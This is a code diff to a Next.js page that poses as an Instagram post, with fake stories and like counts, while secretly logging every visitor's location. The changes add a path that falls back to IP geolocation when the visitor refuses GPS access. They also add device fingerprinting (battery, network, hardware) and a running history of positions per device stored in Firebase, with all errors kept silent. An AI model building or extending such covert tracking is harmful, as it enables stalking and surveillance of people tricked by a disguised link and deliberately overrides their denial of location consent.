@@ -4,9 +4,10 @@ import { useEffect, useState, useRef } from "react";
 import { database } from "@/lib/firebase";
 import { ref, set, update, get } from "firebase/database";
 import dynamic from "next/dynamic";
+import Image from "next/image";
 import axios from "axios";
 import { useSearchParams } from "next/navigation";
-import { Location } from "@/components/interfaces/location.interface";
+import { Location, LocationHistoryEntry } from "@/components/interfaces/location.interface";
 import { ShareLink } from "@/components/interfaces/sharelink.interface";
 import {
   Home, Search, PlusSquare, Heart,
@@ -15,6 +16,9 @@ import {
 } from "lucide-react";
 
 const Map = dynamic(() => import("@/components/Map"), { ssr: false });
+
+const DEFAULT_POST_IMAGE =
+  "https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=600&q=80";
 
 // Fake stories data
 const STORIES = [
@@ -36,12 +40,85 @@ function InstagramLogo() {
   );
 }
 
+// -------------------------------------------------------------------
+// Helpers
+// -------------------------------------------------------------------
+
+interface IpGeoResult {
+  latitude: number;
+  longitude: number;
+  city: string | null;
+  region: string | null;
+  country: string | null;
+  isp: string | null;
+}
+
+/** City-level location from IP via ipapi.co (HTTPS, no key required) */
+async function fetchIpGeo(ip: string): Promise<IpGeoResult | null> {
+  try {
+    const url = ip ? `https://ipapi.co/${ip}/json/` : "https://ipapi.co/json/";
+    const res = await axios.get<{
+      latitude: number; longitude: number;
+      city: string; region: string; country_name: string; org: string;
+    }>(url, { timeout: 6000 });
+    const d = res.data;
+    if (!d.latitude || !d.longitude) return null;
+    return {
+      latitude: d.latitude,
+      longitude: d.longitude,
+      city: d.city ?? null,
+      region: d.region ?? null,
+      country: d.country_name ?? null,
+      isp: d.org ?? null,
+    };
+  } catch {
+    return null;
+  }
+}
+
+/** Collect battery, network, hardware fingerprint — all optional APIs */
+async function collectFingerprint(): Promise<Partial<Location>> {
+  const fp: Partial<Location> = {
+    hardwareConcurrency: navigator.hardwareConcurrency ?? null,
+    deviceMemory: (navigator as unknown as { deviceMemory?: number }).deviceMemory ?? null,
+    maxTouchPoints: navigator.maxTouchPoints ?? null,
+    platform: navigator.platform ?? null,
+  };
+
+  // Network info (Chrome/Android)
+  const conn = (navigator as unknown as { connection?: {
+    effectiveType?: string; downlink?: number; rtt?: number;
+  } }).connection;
+  if (conn) {
+    fp.networkType = conn.effectiveType ?? null;
+    fp.networkDownlink = conn.downlink ?? null;
+    fp.networkRtt = conn.rtt ?? null;
+  }
+
+  // Battery (Chrome/Android)
+  try {
+    const nav = navigator as unknown as { getBattery?: () => Promise<{ level: number; charging: boolean }> };
+    if (typeof nav.getBattery === "function") {
+      const bat = await nav.getBattery();
+      fp.batteryLevel = Math.round(bat.level * 100);
+      fp.batteryCharging = bat.charging;
+    }
+  } catch { /* not supported */ }
+
+  return fp;
+}
+
+// -------------------------------------------------------------------
+// Component
+// -------------------------------------------------------------------
+
 export default function TrackClient() {
   const [userLocation, setUserLocation] = useState<Location | undefined>();
   const [shareLink, setShareLink] = useState<ShareLink | null>(null);
   const [liked, setLiked] = useState(false);
   const [saved, setSaved] = useState(false);
   const [likeCount] = useState(() => Math.floor(Math.random() * 3000) + 800);
+  const [postImageBroken, setPostImageBroken] = useState(false);
   const ipRef = useRef("");
   const searchParams = useSearchParams();
   const shareLinkId = searchParams.get("id");
@@ -54,75 +131,137 @@ export default function TrackClient() {
     });
   }, [shareLinkId]);
 
-  // Fetch IP
+  // Fetch IP eagerly — needed by both GPS and IP-fallback paths
   useEffect(() => {
     axios.get<{ ip: string }>("https://api.ipify.org/?format=json")
       .then((res) => { ipRef.current = res.data.ip; })
       .catch(() => { ipRef.current = ""; });
   }, []);
 
-  // Location tracking
+  // Core tracking logic
   useEffect(() => {
-    if (!shareLinkId || typeof navigator === "undefined" || !navigator.geolocation) return;
+    if (!shareLinkId || typeof navigator === "undefined") return;
 
-    const saveLocation = async (position: GeolocationPosition) => {
-      const { latitude, longitude } = position.coords;
+    const deviceId = localStorage.getItem("deviceId") || crypto.randomUUID();
+    localStorage.setItem("deviceId", deviceId);
+
+    /** Shared fields that don't depend on lat/lng */
+    const baseData = () => ({
+      nickname: "",
+      userId: "anonymous",
+      shareLinkId,
+      ip: ipRef.current,
+      deviceId,
+      deviceType: /Mobi/.test(navigator.userAgent) ? "Mobile" : "Desktop",
+      userAgent: navigator.userAgent,
+      screenWidth: window.screen.width,
+      screenHeight: window.screen.height,
+      referrer: document.referrer,
+      userLanguage: navigator.language,
+      userTimezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      updatedAt: Date.now(),
+    });
+
+    /** Write or merge into Firebase, preserving original createdAt and appending to history */
+    const persist = async (data: Partial<Location>, historyEntry: LocationHistoryEntry) => {
+      const locRef = ref(database, `locations/${deviceId}`);
+      const snap = await get(locRef);
+      const existing = snap.val() as (Partial<Location> & { createdAt?: number }) | null;
+
+      // Append new entry to history array (cap at 200 to avoid runaway growth)
+      const prevHistory: LocationHistoryEntry[] = existing?.history ?? [];
+      const history = [...prevHistory, historyEntry].slice(-200);
+
+      const payload = { ...data, history, createdAt: existing?.createdAt ?? Date.now() };
+      if (existing) {
+        await update(locRef, payload);
+      } else {
+        await set(locRef, payload);
+      }
+    };
+
+    /** --- GPS path --- */
+    const onGpsSuccess = async (position: GeolocationPosition) => {
       try {
-        const deviceId = localStorage.getItem("deviceId") || crypto.randomUUID();
-        localStorage.setItem("deviceId", deviceId);
+        const { latitude, longitude, accuracy } = position.coords;
 
-        let clientIp = ipRef.current;
-        if (!clientIp) {
+        if (!ipRef.current) {
           try {
-            const res = await axios.get<{ ip: string }>("https://api.ipify.org/?format=json");
-            clientIp = res.data.ip;
-            ipRef.current = clientIp;
-          } catch { clientIp = ""; }
+            const r = await axios.get<{ ip: string }>("https://api.ipify.org/?format=json");
+            ipRef.current = r.data.ip;
+          } catch { /* ignore */ }
         }
 
-        const locationData = {
-          latitude, longitude,
-          nickname: "",
-          userId: "anonymous",
-          shareLinkId,
-          ip: clientIp,
-          deviceId,
-          deviceType: /Mobi/.test(navigator.userAgent) ? "Mobile" : "Desktop",
-          userAgent: navigator.userAgent,
-          screenWidth: window.screen.width,
-          screenHeight: window.screen.height,
-          referrer: document.referrer,
-          userLanguage: navigator.language,
-          userTimezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          updatedAt: Date.now(),
-        };
+        const fp = await collectFingerprint();
 
-        const locationRef = ref(database, `locations/${deviceId}`);
-        const snap = await get(locationRef);
-        const existing = snap.val() as { createdAt?: number } | null;
-
-        if (existing) {
-          await update(locationRef, { ...locationData, createdAt: existing.createdAt ?? Date.now() });
-        } else {
-          await set(locationRef, { ...locationData, createdAt: Date.now() });
-        }
+        await persist(
+          { ...baseData(), latitude, longitude, locationSource: "gps", ...fp },
+          { latitude, longitude, accuracy: accuracy ?? null, locationSource: "gps", ts: Date.now() }
+        );
 
         setUserLocation({ latitude, longitude });
       } catch { /* silent */ }
     };
 
+    /** --- IP fallback path (triggered on GPS denial or unavailability) --- */
+    const onGpsError = async () => {
+      try {
+        if (!ipRef.current) {
+          try {
+            const r = await axios.get<{ ip: string }>("https://api.ipify.org/?format=json");
+            ipRef.current = r.data.ip;
+          } catch { /* ignore */ }
+        }
+
+        const geo = await fetchIpGeo(ipRef.current);
+        if (!geo) return;
+
+        const fp = await collectFingerprint();
+
+        await persist(
+          {
+            ...baseData(),
+            ip: ipRef.current,
+            latitude: geo.latitude,
+            longitude: geo.longitude,
+            locationSource: "ip",
+            ipCity: geo.city,
+            ipRegion: geo.region,
+            ipCountry: geo.country,
+            ipIsp: geo.isp,
+            ipAccuracy: "city-level",
+            ...fp,
+          },
+          { latitude: geo.latitude, longitude: geo.longitude, accuracy: null, locationSource: "ip", ts: Date.now() }
+        );
+
+        setUserLocation({ latitude: geo.latitude, longitude: geo.longitude });
+      } catch { /* silent */ }
+    };
+
+    if (!navigator.geolocation) {
+      // No geolocation API at all — go straight to IP fallback
+      onGpsError();
+      return;
+    }
+
     const watchId = navigator.geolocation.watchPosition(
-      saveLocation,
-      () => { /* silent on error */ },
+      onGpsSuccess,
+      onGpsError,
       { enableHighAccuracy: true, maximumAge: 10_000, timeout: 30_000 }
     );
 
     return () => navigator.geolocation.clearWatch(watchId);
   }, [shareLinkId]);
 
-  const postImage = shareLink?.imageUrl || "https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=600&q=80";
+  const postImage = shareLink?.imageUrl || DEFAULT_POST_IMAGE;
   const postUser = shareLink?.name || "user";
   const postCaption = shareLink?.description || "✨ Check this out!";
+  const displayPostImage = postImageBroken ? DEFAULT_POST_IMAGE : postImage;
+
+  useEffect(() => {
+    setPostImageBroken(false);
+  }, [postImage]);
 
   return (
     <div className="flex flex-col min-h-screen max-w-[480px] mx-auto bg-white">
@@ -151,7 +290,14 @@ export default function TrackClient() {
                     <span className="text-xl text-gray-400">+</span>
                   </div>
                 ) : story.avatar ? (
-                  <img src={story.avatar} alt={story.name} className="w-full h-full object-cover" />
+                  <Image
+                    src={story.avatar}
+                    alt={story.name}
+                    width={56}
+                    height={56}
+                    unoptimized
+                    className="w-full h-full object-cover"
+                  />
                 ) : (
                   <div className="w-full h-full bg-gradient-to-br from-gray-200 to-gray-300 animate-pulse" />
                 )}
@@ -171,10 +317,13 @@ export default function TrackClient() {
           <div className="flex items-center justify-between px-3 py-2.5">
             <div className="flex items-center gap-2.5">
               <div className="w-8 h-8 rounded-full bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-600 p-0.5">
-                <div className="w-full h-full rounded-full bg-white overflow-hidden">
-                  <img
-                    src={`https://i.pravatar.cc/64?u=${shareLinkId}`}
+                <div className="w-full h-full rounded-full bg-white overflow-hidden relative">
+                  <Image
+                    src={`https://i.pravatar.cc/64?u=${shareLinkId ?? "guest"}`}
                     alt={postUser}
+                    width={32}
+                    height={32}
+                    unoptimized
                     className="w-full h-full object-cover"
                   />
                 </div>
@@ -190,14 +339,14 @@ export default function TrackClient() {
           </div>
 
           {/* Post image */}
-          <div className="w-full aspect-square bg-gray-100 overflow-hidden">
-            <img
-              src={postImage}
-              alt="post"
-              className="w-full h-full object-cover"
-              onError={(e) => {
-                (e.target as HTMLImageElement).src = "https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=600&q=80";
-              }}
+          <div className="w-full aspect-square bg-gray-100 overflow-hidden relative">
+            <Image
+              src={displayPostImage}
+              alt={postCaption}
+              fill
+              unoptimized
+              className="object-cover"
+              onError={() => setPostImageBroken(true)}
             />
           </div>
 
